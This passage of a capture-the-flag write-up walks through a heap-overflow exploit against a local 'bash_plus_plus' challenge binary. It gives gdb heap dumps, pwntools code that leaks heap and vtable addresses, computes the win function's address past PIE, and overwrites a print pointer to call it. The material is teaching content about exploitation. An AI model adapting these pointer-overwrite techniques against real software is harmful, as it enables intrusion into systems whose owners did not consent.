Chunk(addr=0x55738dfb5310, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055738dfb5310     01 00 00 00 00 00 00 00 88 d2 7f 68 73 55 00 00    ...........hsU..] <- pair for $z variable
Chunk(addr=0x55738dfb5360, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055738dfb5360     03 00 00 00 6c 6f 67 24 76 61 72 58 58 58 58 58    ....log$varXXXXX] <- second log
Chunk(addr=0x55738dfb5380, size=0x5858585858585858, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055738dfb5380     58 58 58 58 58 58 58 58 00 00 00 00 00 00 00 00    XXXXXXXX........] <- the rest of the heap
```
In the `$z` variable, we can see the pointer to the `print` function `e8 cb 7f 68 73 55 00 00` which is located at the address `0x000055738dfb52f0`. As we leaked the address of a string object located in "the rest of the heap", we can compute the number of bytes separating these two addresses: `0x000055738dfb53a0 - 0x000055738dfb52f0 = 0xB0` (176 in decimal). We can now compute the address of the pointer `print` for a `longVariable` we want to display:
```py
# Get the address from the bytes returned by the program
str_addr = int(r.split(b'\n')[0])
# Compute the address of the pointer to print
long_var_ptr = str_addr - 176
```
### Modify value of variable with print pointer address
We want now to change the value of a variable with the computed address and then print its content using the `getLongVar` function. Luckily, this function does not require the type to be `STRING` to print the content that is pointed by the value. So we can put garbage in the type of this variable.

Let's create a new variable and look at the heap:
```py
# Again, create a new log to stop overwritting the previous log
conn.send(b'log\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$vor=sto\n') # I know, I am inspired with the name of the variable
```
The heap is like this:
```
gef➤  x/16wx 0x000055b3c82d6360+0x20+0x20+0x20+0x50+0x20       <- I manually compute the address of the last log chunk
0x55b3c82d6430:	0x00000002	0x24676f6c	0x00726f76	0x00000000
0x55b3c82d6440:	0x00000000	0x00000000	0x00000021	0x00000000
0x55b3c82d6450:	0xa4820bd0	0x000055b3	0x00000001	0x00000000
0x55b3c82d6460:	0xc82d6470	0x000055b3	0x00000021	0x00000000  <- we want to overwrite this address
```
We would like these chunks to become:
```
0x55b3c82d6430:	0x00000002	0x24676f6c	0xXX726f76	0xXXXXXXXX
0x55b3c82d6440:	0xXXXXXXXX	0xXXXXXXXX	0xXXXXXXXX	0xXXXXXXXX
0x55b3c82d6450:	0xXXXXXXXX	0xXXXXXXXX	0xXXXXXXXX	0xXXXXXXXX
0x55b3c82d6460:	0xYYYYYYYY	0xYYYYYYYY	0x00000021	0x00000000 <- Ys represent the address computed before
```
To erase the value of the variable `vor`, we need to add 37 characters followed by the address computed above:
```py
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'X'*37 + bytes(reversed(bytes.fromhex(hex(long_var_ptr)[2:]))) + b'\n')
```
Before looking into the heap to check what we did is correct, just a few notes about `bytes(reversed(bytes.fromhex(hex(long_var_ptr)[2:])))`:
* `long_var_ptr` is the address to the `print` pointer represented as an integer
* We use `hex` to convert it in hexadecimal format
* `[2:]` is used to remove the `0x` at the beginning of the string
* `bytes.fromhex` converts it into bytes to be sent to the program
* As we are in little-endian, we need the low-order byte to be first, so we reverse the order of the bytes using `bytes(reversed(...))`

We can now look the content of the heap:
```
gef➤  x/16wx 0x000055da5ddb6360+0x20+0x20+0x20+0x50+0x20
0x55da5ddb6430:	0x00000003	0x24676f6c	0x58726f76	0x58585858
0x55da5ddb6440:	0x58585858	0x58585858	0x58585858	0x58585858
0x55da5ddb6450:	0x58585858	0x58585858	0x58585858	0x58585858
0x55da5ddb6460:	0x5ddb62f0	0x000055da	0x00000021	0x00000000
```
The pointer of the variable changed so let's look where it points, and the value pointed to:
```
gef➤  x/gx 0x000055da5ddb62f0
0x55da5ddb62f0:	0x000055da4dc35be8
gef➤  x/gx 0x000055da4dc35be8
0x55da4dc35be8 <_ZTV12longVariable+16>:	0x000055da4dc303be
```
We can see that we have a pointer to a pointer that points to the `print` of the `longVariable` class.
### Leak the address of the `print` pointer
With the previous modification, if we print the value of the variable `$vor` in an arithmetic operation, we will have an "error" that will leak the value pointed by the variable:
```py
# Always create a new log
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'log\n')

# Display the error to get $vor value
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$(($vor+$z))\n')

# And print it
r = conn.recvuntil(b'> ')
print(r)
```
When we run the script, we have the following output:
```
b'Invalid variable vor: \xe8\x8b\xe4\xba\x89U\n0\n> '
```
To see to what corresponds these bytes, you can convert them into a readable hexadecimal string:
```py
>>> r=b'Invalid variable vor: \xe8\x8b\xe4\xba\x89U\n0\n> '
>>> bytes(reversed(r.split(b': ')[1].split(b'\n')[0])).hex()
'5589bae48be8'
```
With gdb, we can see where this address points:
```
gef➤  x/gx 0x5589bae48be8
0x5589bae48be8 <_ZTV12longVariable+16>:	0x00005589bae433be
```
We got a pointer to `win`!
### Compute the address to `win`
When we have an address in the code section, it is easy to compute the address of any other symbols in this section because they are all relative to each other. Using `pwn.ELF`, we will get the offset between the `_ZTV12longVariable` and the `win` function. We will then use it to compute the real location of the `win` function in our program (remember to add 16 as shown in gdb, because the pointer we got do not point at the beginning of the `print` function):
```py
elf = pwn.ELF(file)

# Convert the bytes output into an integer
long_var_addr = int(bytes(reversed(r.split(b': ')[1].split(b'\n')[0])).hex(), 16)

# Get the relative offset between the pointer we got and the win function
offset_win = elf.symbols['_ZTV12longVariable'] - elf.symbols['_Z3winv'] + 16

# Compute the real address of the win function
win_addr = long_var_addr - offset_win
```
I let you print the address of `win_addr` and look into gdb to check it correctly points to the `win` function.
# Call the `win` function
To call the `win` function, we should not forget that the pointer in the `variable` object is a pointer to a pointer to the function that will be executed. Therefore, we need to store the address of the `win` function somewhere in the heap, but also overwrite a variable to point to this address.

First, let's store the address of the win function somewhere in the heap. It is easy, we just need to create a `longVariable` with the value of the address of `win`:
```py
# Again, even if it is not necessary this time
# I do not want to pollute the heap more
conn.send(b'log\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$win=' + str(win_addr).encode() + b'\n')
```
Let's see in gdb that we correctly add the address in the heap:
```
gef➤  x/16wx 0x000056524f365360+0x1A0
0x56524f365500:	0x00000002	0x24676f6c	0x006e6977	0x00000000 <- last log chunk
0x56524f365510:	0x00000000	0x00000000	0x00000021	0x00000000
0x56524f365520:	0x3431cbe8	0x00005652	0x00000000	0x00000000 <- variable $win
0x56524f365530:	0x34316dad	0x00005652	0x00000051	0x00000000 <- address to win function
gef➤  x/i 0x0000565234316dad
   0x565234316dad <_Z3winv>:	endbr64
```
To get the address of the last log chunk, I get the address of the last log chunk we created before messing the heap up. You can see that looking at the heap:
```
gef➤  heap chunks
Chunk(addr=0x56524f352010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000056524f352010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x56524f3522a0, size=0x11c10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000056524f3522a0     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x56524f363eb0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000056524f363eb0     01 00 00 00 24 7a 00 00 00 00 00 00 00 00 00 00    ....$z..........]
Chunk(addr=0x56524f363ed0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000056524f363ed0     3e 20 39 31 31 30 36 32 39 36 31 35 38 31 0a 67    > 911062961581.g]
Chunk(addr=0x56524f3642e0, size=0x1010, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000056524f3642e0     24 77 69 6e 3d 39 34 39 31 31 30 36 32 39 36 31    $win=94911062961]
Chunk(addr=0x56524f3652f0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000056524f3652f0     e8 cb 31 34 52 56 00 00 00 00 00 00 00 00 00 00    ..14RV..........]
Chunk(addr=0x56524f365310, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000056524f365310     01 00 00 00 00 00 00 00 90 54 36 4f 52 56 00 00    .........T6ORV..]
Chunk(addr=0x56524f365360, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000056524f365360     03 00 00 00 6c 6f 67 24 76 61 72 58 58 58 58 58    ....log$varXXXXX]
Chunk(addr=0x56524f365380, size=0x5858585858585858, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000056524f365380     58 58 58 58 58 58 58 58 00 00 00 00 00 00 00 00    XXXXXXXX........]
```
The address is `0x000056524f365360`. Then, I count 0x20 bytes for each log created, and 0x90 for each `stringVariable` created. We created 4 logs and 2 `stringVariable`, so there is an offset of 0x1A0 bytes. To get the offset for the `win` pointer, we need to add 0x20 for the log, and 0x10 for the first bytes of the `variable`:
```
gef➤  x/gx 0x000056524f365360+0x1A0+0x30
0x56524f365530:	0x0000565234316dad
gef➤  x/i 0x0000565234316dad
   0x565234316dad <_Z3winv>:	endbr64
```
This is important to know this offset because we need now to create a pointer to this address. Because we have a pointer to the heap (from the first part of this exploit), we can compute the address of the `win` pointer using it:
```py
win_addr_ptr = str_addr - 0x40 + 0x1D0
```
Then, we will have to create a new variable, overwrite the `print` pointer with the `win_addr_ptr` we calculate above, and "print" it:
```py
# We will need to overwrite the next variable
# so we create a new log
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'log\n')

# We don't care about the value of this variable
# We just want to overwrite the print pointer
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$pwn=str\n')

# The pointer is 21 characters after the last log character
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'X'*21 + bytes(reversed(bytes.fromhex(hex(win_addr_ptr)[2:]))) + b'\n')

# Print the variable
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$pwn\n')

# Switch to interactive mode to see the output before the crash
conn.interactive()
```
Now, create a `flag.txt` file next to the application and run the script:
```
$ python3 pwn_bashpp.py 
[+] Starting local process '/home/pierre/Documents/ctf/lakectf/bash_plus_plus/main': pid 6510
[*] '/home/pierre/Documents/ctf/lakectf/bash_plus_plus/main'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'> '
b'0\n> '
b'Creating new log\n> '
b'str\n> '
b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n> '
b'Creating new log\n> '
b'94586601005984\n> '
b'Creating new log\n> '
b'sto\n> '
b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\xf0\xe2\xc0\xa8\x06V\n> '
b'Creating new log\n> '
b'Invalid variable vor: \xe8\xab\xa1r\x06V\n0\n> '
b'Creating new log\n> '
b'94585692966317\n> '
b'Creating new log\n> '
b'str\n> '
b'XXXXXXXXXXXXXXXXXXXXX0\xe5\xc0\xa8\x06V\n> '
[*] Switching to interactive mode
ESPF{FLAG}
[*] Process '/home/pierre/Documents/ctf/lakectf/bash_plus_plus/main' stopped with exit code 0 (pid 6510)
[*] Got EOF while reading in interactive
```
You have the flag!

Note: still a mystery to me, but sometimes, I need to run the script several times because I have an `IndexError: list index out of range`. I did not try to understand that here. If you have an idea, tell me.